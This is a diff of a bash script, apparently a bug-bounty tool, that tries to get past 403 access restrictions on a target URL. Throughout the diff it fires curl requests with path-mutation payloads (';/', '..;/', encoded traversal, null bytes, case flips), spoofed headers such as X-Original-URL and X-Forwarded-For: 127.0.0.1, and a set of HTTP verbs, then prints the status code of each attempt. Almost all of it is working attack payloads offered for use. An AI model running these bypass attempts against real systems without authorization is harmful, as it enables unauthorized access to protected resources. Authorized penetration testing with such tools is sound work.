@@ -10,10 +10,15 @@ then
 	echo "	-r Allow redirection if response is 3XX"
 	exit
 fi
+# bash neet set RED,GREEN,YELLOW,CLEAR empty
+RED="\e[1m\e[31m"
+GREEN="\e[1m\e[32m"
+YELLOW="\e[1m\e[33m"
+CLEAR="\e[0m"
 
 METHOD="-XGET" # default is GET
-TIMEOUT="" # TIMEOUT="-m 2"
-USER_AGENT="-AMozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36"
+TIMEOUT=-m"0" # TIMEOUT="-m 2"
+USER_AGENT=-A"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36"
 
 #Check optional arguments
 REDIRECT=""
@@ -50,31 +55,41 @@ if [ $? -gt 0 ]; then
 fi
 
 # strip "/" from the suffix of  URL
-if [ $ONLY_URL -ne 1 ]; then URL=${URL%/} fi
+if [ $ONLY_URL -ne 1 ]; then
+	URL=${URL%/}
+fi
 
 # strip "/" from the prefix of DIR
 DIR=${DIR#/}
 
 function curl_wapper(){
-	curl -k -s -o /dev/null -w "%{http_code}","%{size_download}" $TIMEOUT $USER_AGENT $REDIRECT $METHOD $@
+	curl -k -s -o /dev/null -w "%{http_code}","%{size_download}" "$USER_AGENT" "$TIMEOUT" $REDIRECT "$METHOD" "$@"
 }
 
 function payload_Suffux(){
 	# $1: full url with out "/" suffux
-	output "${1}*" $(curl_wapper "${1}*")
-	output "${1};" $(curl_wapper "${1};")
-	output "${1}%3f" $(curl_wapper "${1}%3f")
-	output "${1}%20" $(curl_wapper "${1}%20")
-	output "${1}%F3%A0%81%A9" $(curl_wapper "${1}%F3%A0%81%A9")
-	output "${1};/" $(curl_wapper "${1};/")
-	output "${1}%2f" $(curl_wapper "${1}%2f")
-	output "${1}.json" $(curl_wapper "${1}.json")
-	output "${1}%23" $(curl_wapper "${1}%23")
-	output "${1}%00" $(curl_wapper "${1}%00")
-	output "${1}..;/" $(curl_wapper "${1}..;/")
-	output "${1}%" $(curl_wapper "${1}%")
-	output "${1}?" $(curl_wapper "${1}?")
-	output "${1}??" $(curl_wapper "${1}??")
+	if [[ x$(echo ${1}|cut -d '/' -f4) != x ]]; then
+		# fix https://www.baidu.com*/
+		output "${1}*" $(curl_wapper "${1}*")
+		output "${1};" $(curl_wapper "${1};")
+		output "${1}%3f" $(curl_wapper "${1}%3f")
+		output "${1}%20" $(curl_wapper "${1}%20")
+		output "${1}%F3%A0%81%A9" $(curl_wapper "${1}%F3%A0%81%A9")
+		output "${1};/" $(curl_wapper "${1};/")
+		output "${1}%2f" $(curl_wapper "${1}%2f")
+		output "${1}.json" $(curl_wapper "${1}.json")
+		output "${1}%23" $(curl_wapper "${1}%23")
+		output "${1}%00" $(curl_wapper "${1}%00")
+		output "${1}..;/" $(curl_wapper "${1}..;/")
+		output "${1}%" $(curl_wapper "${1}%")
+		output "${1}?" $(curl_wapper "${1}?")
+		output "${1}??" $(curl_wapper "${1}??")
+		output "${1}\..\.\\" $(curl_wapper "${1}\..\.\\")
+		upper_end=${1:0:${#1}-1}$(tr '[:lower:]' '[:upper:]' <<< ${1:${#1}-1:1})
+		lower_end=${1:0:${#1}-1}$(tr '[:upper:]' '[:lower:]' <<< ${1:${#1}-1:1})
+		output "${upper_end}" $(curl_wapper ${upper_end})
+		output "${lower_end}" $(curl_wapper ${lower_end})
+	fi
 
 	output "${1}/*" $(curl_wapper "${1}/*")
 	output "${1}/;" $(curl_wapper "${1}/;")
@@ -98,7 +113,6 @@ function payload_Suffux(){
 	output "${1}//" $(curl_wapper "${1}//")
 	output "${1}/./" $(curl_wapper "${1}/./")
 	output "${1}/../" $(curl_wapper "${1}/../")
-	output "${1}\..\.\\" $(curl_wapper "${1}\..\.\\")
 	output "${1}/%2e%2e/" $(curl_wapper "${1}/%2e%2e/")
 	output "${1}/%2e%2e%2f" $(curl_wapper "${1}/%2e%2e%2f")
 
@@ -111,7 +125,12 @@ function payload_Suffux(){
 function payload_Between(){
 	# $1 URL
 	# $2 DIR
-	output "${1};/${2}" $(curl_wapper "${1};/${2}")
+	if [[ x$(echo ${URL}|cut -d '/' -f4) != x ]]; then
+		# fix https://www.baidu.com;/
+		output "${1};/${2}" $(curl_wapper "${1};/${2}")
+		output "${1}\..\.\\\\${2}" $(curl_wapper "${1}\..\.\\${2}")
+	fi
+
 	output "${1}/%2e/${2}" $(curl_wapper "${1}/%2e/${2}")
 	output "${1}/;${2}" $(curl_wapper "${1}/;${2}")
 	output "${1}/randomstr/../${2}" $(curl_wapper "${1}/randomstr/../${2}")
@@ -124,42 +143,48 @@ function payload_Between(){
 	output "${1}/.%2f${2}" $(curl_wapper "${1}/.%2f${2}")
 	output "${1}/%2f${2}" $(curl_wapper "${1}/%2f${2}")
 	output "${1}//${2}" $(curl_wapper "${1}//${2}")
-	output "${1}\..\.\\\\${2}" $(curl_wapper "${1}\..\.\\${2}")
+	upper_start=${1}/$(tr '[:lower:]' '[:upper:]' <<< ${2:0:1})${2:1}
+	lower_start=${1}/$(tr '[:upper:]' '[:lower:]' <<< ${2:0:1})${2:1}
+	output "${upper_start}" $(curl_wapper "${upper_start}")
+	output "${lower_start}" $(curl_wapper "${lower_start}")
+}
+
+function payload_Both(){
+	:
+	# statements
 }
 
 function payload_Header(){
 	FULL_URL=$1
-	fqdn_url=${${FULL_URL%%//*}}//$(echo ${FULL_URL}|cut -d'/' -f 3)/
-	rewrite_url=${${FULL_URL#*//}#*/}
+	fqdn_url=${FULL_URL%%//*}//$(echo ${FULL_URL}|cut -d'/' -f 3)/
+	tmp=${FULL_URL#*//}
+	rewrite_url=${tmp#*/}
 	# https://www.baidu.com/a/b/c/d
 	# $1(FULL_URL): https://www.baidu.com/a/b/c/d
 	# fqdn_url: https://www.baidu.com/
 	# rewrite_url: a/b/c/d
-	output "X-Custom-IP-Authorization: 127.0.0.1 \t ${FULL_URL%/}..;/"  $(curl_wapper -H "X-Custom-IP-Authorization: 127.0.0.1" "${FULL_URL%/}..;/")
+	if [[ x$(echo ${FULL_URL}|cut -d '/' -f4) != x ]]; then
+		# fix https://www.baidu.com..;/
+		output "X-Custom-IP-Authorization: 127.0.0.1 \t ${FULL_URL%/}..;/"  $(curl_wapper -H "X-Custom-IP-Authorization: 127.0.0.1" "${FULL_URL%/}..;/")
+	fi
 	output "X-Custom-IP-Authorization: 127.0.0.1 \t $FULL_URL"  $(curl_wapper -H "X-Custom-IP-Authorization: 127.0.0.1" $FULL_URL)
 	output "X-Custom-IP-Authorization: 127.0.0.1 \t $FULL_URL"  $(curl_wapper -H "X-Custom-IP-Authorization: 127.0.0.1" $FULL_URL)
 	output "X-Custom-IP-Authorization: 127.0.0.1 \t $FULL_URL"  $(curl_wapper -H "X-Custom-IP-Authorization: 127.0.0.1" $FULL_URL)
 	output "X-Forwarded-For: http://127.0.0.1 \t $FULL_URL"  $(curl_wapper -H "X-Forwarded-For: http://127.0.0.1" $FULL_URL)
 	output "X-Forward-For: http://127.0.0.1 \t $FULL_URL"  $(curl_wapper -H "X-Forward-For: http://127.0.0.1" $FULL_URL)
 	output "X-Forwarded-For: 127.0.0.1:80 \t $FULL_URL"  $(curl_wapper -H "X-Forwarded-For: 127.0.0.1:80" $FULL_URL)
-	output "X-Original-URL: /$rewrite_url \t $fqdn_url"  $(curl_wapper -H "X-Original-URL: /$rewrite_url" "$fqdn_url")
-	output "X-Rewrite-URL: /$rewrite_url \t $fqdn_url"  $(curl_wapper -H "X-Rewrite-URL: /$rewrite_url" $fqdn_url)
+	output "X-Original-URL: /$rewrite_url \t $fqdn_url"  $(curl_wapper -H "X-Original-URL: /$rewrite_url" "${fqdn_url}anything")
+	output "X-Rewrite-URL: /$rewrite_url \t $fqdn_url"  $(curl_wapper -H "X-Rewrite-URL: /$rewrite_url" "${fqdn_url}anything")
 	output "X-Forwarded-For: 127.0.0.1 \t $FULL_URL"  $(curl_wapper -H "X-Forwarded-For: 127.0.0.1" $FULL_URL)
 	output "X-Originating-IP: 127.0.0.1 \t $FULL_URL"  $(curl_wapper -H "X-Originating-IP: 127.0.0.1" $FULL_URL)
 	output "X-Remote-IP: 127.0.0.1 \t $FULL_URL"  $(curl_wapper -H "X-Remote-IP: 127.0.0.1" $FULL_URL)
 	output "X-Remote-Addr: 127.0.0.1 \t $FULL_URL"  $(curl_wapper -H "X-Remote-Addr: 127.0.0.1" $FULL_URL)
 	output "X-Client-IP: 127.0.0.1 \t $FULL_URL"  $(curl_wapper -H "X-Client-IP: 127.0.0.1" $FULL_URL)
 	output "X-Forwarded-Host: 127.0.0.1 \t $FULL_URL"  $(curl_wapper -H "X-Forwarded-Host: 127.0.0.1" $FULL_URL)
-	output "Referer: $FULL_URL \t $FULL_URL"  $(curl_wapper -H "Referer: $FULL_URL" $FULL_URL)
 	output "X-Host: 127.0.0.1 \t $FULL_URL"  $(curl_wapper -H "X-Host: 127.0.0.1" $FULL_URL)
 	output "Host: 127.0.0.1 \t $FULL_URL"  $(curl_wapper -H "Host: 127.0.0.1" $FULL_URL)
-
+	output "Referer: $FULL_URL \t $FULL_URL"  $(curl_wapper -H "Referer: $FULL_URL" $FULL_URL)
 }
-
-RED="\e[1m\e[31m"
-GREEN="\e[1m\e[32m"
-YELLOW="\e[1m\e[33m"
-CLEAR="\e[0m"
 
 function output(){
 	# $1 output url
@@ -175,66 +200,43 @@ function output(){
     fi
 }
 
-function HTTPMethod(){
-	# $1 method
-	# $2 status and comtent-length (200,1234)
-	# $3 payload with url
-	echo -n "$1 request:\t"
-	STATUS=$(echo $2|cut -d',' -f 1)
-	LENGTH=$(echo $2|cut -d',' -f 2)
-    if [[ ${STATUS} =~ 2.. ]]; then
-    	if [[ $1 == "POST" ]]; then
-    		CURL="curl $REDIRECT -ki -H \"Content-Length: 0\" -X $1 $3"
-    	elif [[  $1 == "HEAD"  ]]; then
-    		CURL="curl $REDIRECT -ki  -m 1 -X $1 $3"
-    	else
-    		CURL="curl $REDIRECT -ki -X $1 $3"
-    	fi
-    	echo -e "${GREEN}${2} \t\t=> ${CURL}${CLEAR}"
-    elif [[ ${STATUS} =~ 3.. ]]
-    then 
-    	echo -e "${YELLOW}${2}${CLEAR}"
-    else
-    echo -e "${RED}${2}${CLEAR}"
-    fi
-}
-
 FULL_URL="${URL}/${DIR}"
 
-if [ $ONLY_URL -eq 1 ]; then FULL_URL="${URL}" fi
-
+if [ $ONLY_URL -eq 1 ]; then
+	FULL_URL="${URL}"
+fi
+######################## ip versoin ######################### 
 echo -e "\n${GREEN}[+] IP Version...${CLEAR}"
 output "curl --ipv4 $FULL_URL"  $(curl_wapper -4 $FULL_URL)
 output "curl --ipv6 $FULL_URL"  $(curl_wapper -6 $FULL_URL)
 
-######################## HTTP Methods ######################## 
+####################### HTTP Methods ######################## 
 echo -e "\n${GREEN}[+] HTTP Methods...${CLEAR}"
 #DELETE disabled by default, too dangerous
-# echo -n "DELETE request: "
-for Verb in {"GET","HEAD","POST","PUT","TRACE","TRACK","PATCH","LS","MOVE","CONNECT","OPTIONS"}
+for Verb in {"OPTIONS","HEAD","GET","PUT","POST","TRACE","TRACK","PATCH","MOVE","CONNECT","LS"}
 do
 	if [[ $Verb == "POST" ]]; then
-		STATUS=$(curl_wapper -H "Content-Length: 0" -X POST $FULL_URL)
+		output "$Verb \t $FULL_URL" $(curl_wapper -H "Content-Length: 0" -X POST $FULL_URL)
 	elif [[  $Verb == "HEAD"  ]]; then
-		STATUS=$(curl_wapper -m 1 -X HEAD $FULL_URL) # timeout=1
+		output "$Verb \t $FULL_URL" $(curl_wapper -m 1 -X HEAD $FULL_URL) # timeout=1
 	else
-		STATUS=$(curl_wapper -X $Verb $FULL_URL)
+		output "$Verb \t $FULL_URL" $(curl_wapper -X $Verb $FULL_URL)
 	fi
-	HTTPMethod $Verb $STATUS $FULL_URL
 done
 
-####################### Bugbountytips ##########################
+###################### Bugbountytips ##########################
 echo -e "\n${GREEN}[+] Bugbountytips 40x bypass methods...${CLEAR}"
 FULL_URL_1="${URL}/${DIR%/}"
-if [ $ONLY_URL -eq 1 ]; then FULL_URL_1="${URL%/}" fi
+if [ $ONLY_URL -eq 1 ]; then 
+	FULL_URL_1="${URL%/}" 
+fi
 payload_Suffux $FULL_URL_1
 
 if [ $ONLY_URL -ne 1 ]; then
 	payload_Between ${URL} ${DIR}
+	payload_Both ${URL} ${DIR}
 fi
 
 ########################## HEADERS #############################
 echo -e "\n${GREEN}[+] HEADERS...${CLEAR}"
-# FULL_URL="${URL}/${DIR}"
-# if [ $ONLY_URL -eq 1 ]; then FULL_URL="${URL}" fi
 payload_Header $FULL_URL
